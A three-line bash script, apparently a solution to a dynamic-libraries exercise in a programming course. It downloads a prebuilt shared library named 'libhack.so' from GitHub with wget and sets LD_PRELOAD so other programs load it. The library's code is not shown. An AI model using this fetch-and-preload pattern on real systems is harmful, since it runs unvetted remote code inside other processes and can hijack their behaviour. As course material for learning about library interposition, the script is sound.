#!/bin/bash
wget -P ../ https://github.com/DemisoDaba/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=../libhack.so
